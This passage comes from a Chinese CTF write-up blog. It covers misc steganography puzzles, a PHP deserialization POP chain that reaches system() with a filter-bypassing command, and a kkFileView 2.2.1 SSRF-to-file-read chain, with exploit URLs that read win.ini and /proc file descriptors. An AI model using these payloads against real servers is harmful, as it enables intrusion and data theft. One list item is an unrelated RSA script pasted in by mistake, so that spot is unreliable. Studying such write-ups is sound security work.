alt="img"></p><p>这样就可以调用这些模块了，原题有提示在env中，os.environ即可</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146056311.png" alt="img"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="我的壁纸"><a href="#我的壁纸" class="headerlink" title="我的壁纸"></a>我的壁纸</h2><p>套娃题，拿了个一血</p><p>拿到bg.jpg</p><p>看到文件中有很多504B0304，分离出zip</p><p>拿到flag.txt、flag.wav、youshouldknowme.jpeg</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146056312.png" alt="img"></p><p>flag.txt是snow隐写，密码为rar中的注释，得到flag3</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146056413.png" alt="img"></p><p>flag.wav是sstv</p><p>用rx-sstv可以看到一张二维码，扫出来得到flag2</p><p>youshouldknowme.jpeg是steghide，密码在文件尾</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146056414.png" alt="img"></p><p>拿到flag1</p><p>3段flag拼起来得到最后的flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯</title>
    <link href="/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
    <url>/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023香山杯"><a href="#2023香山杯" class="headerlink" title="2023香山杯"></a>2023香山杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>签到题，比较简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title class_">Welcome</span>::<span class="hljs-variable constant_">__destruct</span>   <span class="hljs-variable">$name</span><br><span class="hljs-title class_">H4ck3r</span>::<span class="hljs-variable constant_">__toString</span>  <span class="hljs-variable">$func</span><br><span class="hljs-title class_">G00d</span>::<span class="hljs-variable constant_">__invoke</span> <br></code></pre></td></tr></table></figure><p>这里过滤了flag字符，利用more+正则匹配[0-z]绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;more+/[0-z][0-z][0-z][0-z]&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="sharedBox"><a href="#sharedBox" class="headerlink" title="sharedBox"></a>sharedBox</h2><p>hint：kkfileview2.2.1 的漏洞利用</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>项目地址：<a href="https://github.com/kekingcn/kkFileView">https://github.com/kekingcn/kkFileView</a></p><p>git下来后回退到2.2.1版本</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243500124.png" alt="img"></p><p>因为我本地是windows，所以还要下载OpenOffice</p><p><a href="https://www.openoffice.org/download/">https://www.openoffice.org/download/</a></p><p>下载安装完根据readme运行FilePreviewApplication的main方法</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349331.png" alt="img"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>访问<code>http://localhost:8012</code></p><p>原题的kkfileview部署在<code>/fileview/</code>下，本地在<code>/</code>，原题用的linux，本地为windows</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349332.png" alt="img"></p><p>存在3个路由</p><p><code>/onlinePreview</code>、<code>picturesPreview</code>、<code>/getCorsFile</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349333.png" alt="img"></p><p>主要漏洞点：</p><p><code>/onlinePreview</code>，在线浏览功能，这里有一个xss和ssrf的漏洞 <code>picturesPreview</code>，图片预览，有xss漏洞 <code>/getCorsFile</code>，任意文件读取和ssrf漏洞</p><p>具体分析：</p><ol><li>xxxxxxxxxx import gmpy2from Crypto.Util.number import <em>n &#x3D; 121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313r &#x3D; getPrime(6)e &#x3D; 65537a &#x3D; 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699c &#x3D; 42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267p &#x3D; gmpy2.next_prime(a - r)q &#x3D; gmpy2.next_prime(gmpy2.next_prime(a) + r)​phi_n &#x3D; (p-1)</em>(q-1)d &#x3D; gmpy2.invert(e,phi_n)m &#x3D; pow(c,d,n)print(long_to_bytes(m))Python</li></ol><p>支持file和http协议，而且没有过滤，造成ssrf</p><ol><li><code>/getCorsFile</code>下断点</li></ol><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349334.png" alt="img"></p><p>跟进到<code>getInputStreamFromUrl</code>这里没有过滤传入的字符，造成了任意文件读取</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349335.png" alt="img"></p><p>可以参考：<a href="https://github.com/kekingcn/kkFileView/issues/128">https://github.com/kekingcn/kkFileView/issues/128</a></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在题目的环境中对<code>getCorsFile</code>进行了限制，直接访问的话会返回 403</p><p>那么就由此有了一个思路：<code>onlinePreview接口ssrf请求到getCorsFile</code>，然后任意文件读取</p><p>即<code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>但是，我们来看看实际效果</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349336.png" alt="img"></p><p>文件类型不支持，那么从源码里看看它为什么不支持，以及支持什么格式的文件</p><p>下个断点</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349337.png" alt="img"></p><p>跟进到这一段，经过<code>getFileNameFromURL</code>处理后得到文件名为<code>getCorsFile</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349338.png" alt="img"></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349339.png" alt="img"></p><p>最终传入判断后返回不支持</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493410.png" alt="img"></p><p>那么这也说明了无后缀文件是无法读取的，那看看支持的文件格式</p><p>看到这里，返回有picture、pdf、media等，但是这些肯定不支持文本形式的flag</p><p>然后注意到<code>simText</code>类型</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493411.png" alt="img"></p><p>支持<code>txt</code>、<code>jsp</code>等</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493412.png" alt="img"></p><p>现在引入一个知识点</p><p>spring boot的路径匹配</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493413.png" alt="img"></p><p>而源码中的版本恰好是1.5.8</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493414.png" alt="img"></p><p>那么就有了一个思路：</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>这样就会解析成</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>然后服务端又是怎么处理这个多出来的<code>.txt</code>呢</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493415.png" alt="img"></p><p>可以看到file目录下多了<code>getCorsFile.txt</code>，里面的内容就是要读的文件的内容</p><p>那么这个是怎么实现的呢</p><p>onlinePreview 最后调用了 <code>filePreviewHandle</code>，然后调用了 <code>downLoad</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493416.png" alt="img"></p><p><code>downLoad</code>中利用<code>saveBytesToOutStream</code>将读的内容写入文件</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493417.png" alt="img"></p><p>这里解释了为什么会多一个<code>getCorsFile.txt.txt</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493418.png" alt="img"></p><p>最后就是怎么读取<code>getCorsFile.txt</code></p><p>正常思路</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt</code></p><p>但是刚刚提到spring boot特性会将<code>getCorsFile.txt</code>解析为<code>getCorsFile</code></p><p>所以用<code>%01</code>、<code>%02</code>等不可见字符（猜测是不可见字符，本地测试是可以的）绕过<code>http://localhost:8012/%01getCorsFile.txt</code></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>综合上述</p><p>将文件写入</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>读文件</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/%09getCorsFile.txt</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493419.png" alt="img"></p><p>比赛环境已经关了，赛题的后续利用无法复现了</p><p>最后贴个lxxxin师傅的题解，参考：<a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</a></p><blockquote><p>最终Payload如下，题目应该是在nginx或者&#x2F;onlinePreview路由处对proc、fd关键字做了匹配，由于是SSRF，会发起两次http请求，因此可以通过双重URL编码绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/onlinePreview?url=http://localhost:8012/getCorsFile.jsp?urlPath=file:///%2570%2572%256f%2563/29/%2566%2564/6</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493420.png" alt="img"></p><p>绕过后，读取的文件内容会保存在getCorsFile.jsp中，用%09、%02等字符绕过一下读取文件即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/%09getCorsFile.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493421.png" alt="img"></p><p>比赛的时候，&#x2F;flag提示我们要RCE，但是这题可以通过非预期读取&#x2F;proc&#x2F;29&#x2F;fd&#x2F;6获取到flag</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493422.png" alt="img"></p><p>预期应该是读&#x2F;root&#x2F;flag.java文件，然后再往下走……，这里因为赛后靶机关了，也就没机会尝试了，具体的flag.java代码如下，感兴趣的师傅可以自行尝试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">flag</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            input = Files.newInputStream(Paths.get(<span class="hljs-string">&quot;/tmp/config.properties&quot;</span>));<br>            <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>                <span class="hljs-comment">// 连接到SQLite数据库</span><br>                <span class="hljs-comment">// 创建一个属性对象</span><br>                prop.load(input);<br><br>                <span class="hljs-comment">// 创建一个Connection对象，并传入属性对象</span><br>                conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite:/tmp/mydatabase.db&quot;</span>, prop);<br>                <span class="hljs-comment">// 设置密码</span><br>                <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>                stmt.close();<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>            &#125;<br>            <span class="hljs-comment">// 接下来，你可以在此处执行其他操作</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) &#123;<br>                    conn.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>                System.out.println(ex.getMessage());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动文件（&#x2F;root&#x2F;start.sh）如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>FLAG_PATH=/tmp/config.properties<br>FLAG_MODE=M_SED<br>if [ $&#123;ICQ_FLAG&#125; ];then<br>    case $FLAG_MODE in<br>        &quot;M_ECHO&quot;)<br>            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;<br>            FILE_MODE=755 <br>            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SED&quot;)<br>            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SQL&quot;)<br>            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;<br>            ;;<br>        *)<br>            ;;<br>    esac<br>    echo [+] ICQ_FLAG OK   <br>    unset ICQ_FLAG <br>else<br>    echo [!] no ICQ_FLAG<br>fi<br><br>unset ICQ_FLAG<br>rm -rf /etc/profile.d/pouchenv.sh<br>rm -rf /etc/instanceInfo<br>rm -rf /start.sh<br><br>/usr/sbin/nginx<br><br>/usr/sbin/crond<br><br>/usr/sbin/rsyslogd<br><br>javac /root/flag.java<br>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;<br><br>nohup java -jar /root/upload.jar &gt;/dev/null &amp;<br>sleep 1;<br><br>rm /tmp/config.properties<br><br>java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;<br>exec tail -f /dev/null<br></code></pre></td></tr></table></figure></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/">https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/</a></p><p><a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</a></p><p><a href="https://www.cnblogs.com/xbbth/p/17446987.html">https://www.cnblogs.com/xbbth/p/17446987.html</a></p><p><a href="https://github.com/kekingcn/kkFileView/issues/128">https://github.com/kekingcn/kkFileView/issues/128</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PINTU"><a href="#PINTU" class="headerlink" title="PINTU"></a>PINTU</h2><p>图片像素rgb值转2进制再转成字符串发现提示</p><p>然后图片高度隐写，8进制转10进制再转成ascii，发现是每两个字符为一组（因为中间有空格分隔）</p><p>再转一次ascii码，得到一串字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-comment">#img_width = 65 # 所有图片的统一宽度</span><br>img_num = <span class="hljs-number">4703</span> <span class="hljs-comment"># 图片总数</span><br>num = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment">#图片像素转二进制</span><br>heigth_list = [] <span class="hljs-comment">#高度list</span><br>ten_chr = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#高度转10进制</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, img_num+<span class="hljs-number">1</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;pintu/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>) <span class="hljs-comment"># 打开图片</span><br>    <span class="hljs-comment">#像素rgb转二进制</span><br>    pixel = img.getpixel((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment">#print(pixel)</span><br>    <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">0</span>:<br>        num += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        num += <span class="hljs-string">&#x27;1&#x27;</span><br>    <br>    heigth_list.append(img.height)<br>    <br>num = <span class="hljs-built_in">int</span>(num,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(num).decode())<br><span class="hljs-string">&#x27;&#x27;&#x27;flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                        